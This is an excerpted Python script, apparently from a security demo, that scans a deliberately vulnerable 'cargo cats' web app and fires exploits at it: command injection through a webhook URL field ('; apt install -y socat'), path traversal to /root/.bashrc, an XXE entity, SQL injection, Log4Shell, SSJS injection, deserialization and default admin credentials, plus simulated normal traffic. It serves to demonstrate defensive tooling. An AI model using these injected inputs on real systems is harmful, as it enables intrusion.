...
cargo_cats_url = "{{ .Values.consoleui.vulnAppUrl }}"
base_cargo_cats_url_encoded = urllib.parse.quote(f"{cargo_cats_url}/")
first_run = True
scan_running = False
...
def scan():
    ...
    #spider index
    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url={base_cargo_cats_url_encoded}%2F&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)
    #spider dashboard
    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url={base_cargo_cats_url_encoded}%2Fdashboard&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)
    ...
    r = requests.get(f"{zap_url}/JSON/ajaxSpider/action/scanAsUser/?contextName=Default&userName=admin&url={base_cargo_cats_url_encoded}%2Fdashboard&subtreeOnly=", timeout=5)
...
def run_login_exploit(session):
    ...
    r = session.post(f"{cargo_cats_url}/login", data=creds, timeout=10, allow_redirects=True)
...
def run_command_injection_exploit(session):
    ...
    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=5)
    ...
    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=20)
    log_exploit_output(f"APT update response status: {r.status_code}")

    # Socat Installation
    body = {"url":"google.com; apt install -y socat"}
    r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=30)
...
def run_path_traversal_exploit(session):
    ...
    if r.status_code == 200:
        try:
            ...
            try:
                r_write = session.post(f"{cargo_cats_url}/api/photos/upload", files=files, timeout=10, allow_redirects=False)
            ...
            r_verify = session.get(f"{cargo_cats_url}/api/photos/view?path=../../root/.bashrc", timeout=5)
...
def run_sql_injection_exploit(session):
    ...
    r = session.post(f"{cargo_cats_url}/api/payments/process", 
...
def run_log4shell_exploit(session):
    ...
    r = session.post(f"{cargo_cats_url}/login", 
...
def run_ssjs_injection_exploit(session):
    ...
    r = session.post(f"{cargo_cats_url}/api/labels/generate", 
                    json=ssjs_payload, 
                    timeout=10)
...
<w:p><w:r><w:t>Medical History: &xxe;</w:t></w:r></w:p>
    ...
    r = session.post(f"{cargo_cats_url}/api/documents/process", files=files, timeout=10, allow_redirects=False)
...
def run_deserialization_exploit(session):
    ...
    try:
        ...
        r = session.post(f"{cargo_cats_url}/api/addresses/import", files=files, timeout=10, allow_redirects=False)
...
def traffic():
    ...
    try:
        ...
        # Visit home page
        r = session.get(f"{cargo_cats_url}/", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited home page - Status: {r.status_code}")
        
        # Test shipment tracking with wrong ID
        r = session.get(f"{cargo_cats_url}/api/shipments/track?trackingId=wrong", timeout=5, allow_redirects=False)
        ...
        # Visit login page
        r = session.get(f"{cargo_cats_url}/login", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited login page - Status: {r.status_code}")
        
        # Failed login attempt
        failed_creds = {"username": "wrong", "password": "wrong"}
        r = session.post(f"{cargo_cats_url}/login", data=failed_creds, timeout=10, allow_redirects=False)
        log_traffic_output(f"Failed login attempt - Status: {r.status_code}")
        
        # Visit login error page
        r = session.get(f"{cargo_cats_url}/login?error=true", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited login error page - Status: {r.status_code}")
        
        # Successful login
        success_creds = {"username": "admin", "password": "password123"}
        r = session.post(f"{cargo_cats_url}/login", data=success_creds, timeout=10, allow_redirects=False)
        ...
        # Visit dashboard
        r = session.get(f"{cargo_cats_url}/dashboard", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited dashboard - Status: {r.status_code}")
        
        # Dashboard shipment tracking with valid ID
        r = session.get(f"{cargo_cats_url}/api/shipments/track?trackingId=TRACK-48460B74", timeout=5, allow_redirects=False)
        log_traffic_output(f"Dashboard shipment tracking - Status: {r.status_code}")
        
        # Get cat facts for dashboard
        r = session.get(f"{cargo_cats_url}/api/cats/facts", timeout=5, allow_redirects=False)
        ...
        # Visit cats page
        r = session.get(f"{cargo_cats_url}/cats", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited cats page - Status: {r.status_code}")
        
        # Cats API call
        r = session.get(f"{cargo_cats_url}/api/cats", timeout=5, allow_redirects=False)
                ...
                for cat in cats_data:
                    if cat.get('image') and '/api/photos/view' in cat.get('image', ''):
                        ...
                        if image_url.startswith('/api/photos/view'):
                            full_image_url = f"{cargo_cats_url}{image_url}"
                        else:
        ...
        r = session.post(f"{cargo_cats_url}/api/photos/upload", files=files, timeout=10, allow_redirects=False)
        ...
        if uploaded_image_path:
            r = session.get(f"{cargo_cats_url}/api/photos/view?path={uploaded_image_path}", timeout=5, allow_redirects=False)
        ...
        r = session.get(f"{cargo_cats_url}/api/photos/view?path=nonexistent/image.jpg", timeout=5, allow_redirects=False)
        log_traffic_output(f"Non-existent image view test - Status: {r.status_code}")
        
        # Test upload without file parameter
        r = session.post(f"{cargo_cats_url}/api/photos/upload", data={}, timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/photos/upload", files=invalid_files, timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/cats", json=cat_data_with_image, timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/cats", json=cat_data, timeout=5, allow_redirects=False)
        ...
        r = delete_session.delete(f"{cargo_cats_url}/api/cats/2", timeout=5, allow_redirects=False)
...
<w:p><w:r><w:t>Medical History for Cat: Test vaccination records and health notes.</w:t></w:r></w:p>
        ...
        r = session.get(f"{cargo_cats_url}/api/documents/health", timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/documents/process", files=invalid_files, timeout=5, allow_redirects=False)
        ...
        r = session.get(f"{cargo_cats_url}/addresses", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited addresses page - Status: {r.status_code}")
        
        # Addresses API call
        r = session.get(f"{cargo_cats_url}/api/addresses", timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/addresses", json=address_data, timeout=5, allow_redirects=False)
        ...
        # Visit webhooks page
        r = session.get(f"{cargo_cats_url}/webhooks", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited webhooks page - Status: {r.status_code}")
        
        # Webhooks API interactions
        r = session.get(f"{cargo_cats_url}/api/shipments", timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/webhook/test-shipment-notification", json=test_notification_body, timeout=5, allow_redirects=False)
        ...
        r = session.patch(f"{cargo_cats_url}/api/shipments/1/webhook", json=webhook_body, timeout=5, allow_redirects=False)
        log_traffic_output(f"Webhook API PATCH shipments/1/webhook - Status: {r.status_code}")
        
        body = {"url": "contrastsecurity.com"}
        r = session.post(f"{cargo_cats_url}/api/webhook/test-connection", json=body, timeout=5, allow_redirects=False)
        ...
        try:
            r = session.get(f"{cargo_cats_url}/api/addresses/export", timeout=10, allow_redirects=False)
        ...
        r = session.get(f"{cargo_cats_url}/shipments", timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/payments/process", json=payment_data, timeout=5, allow_redirects=False)
        ...
        r = session.post(f"{cargo_cats_url}/api/labels/generate", json=label_data, timeout=10, allow_redirects=False)
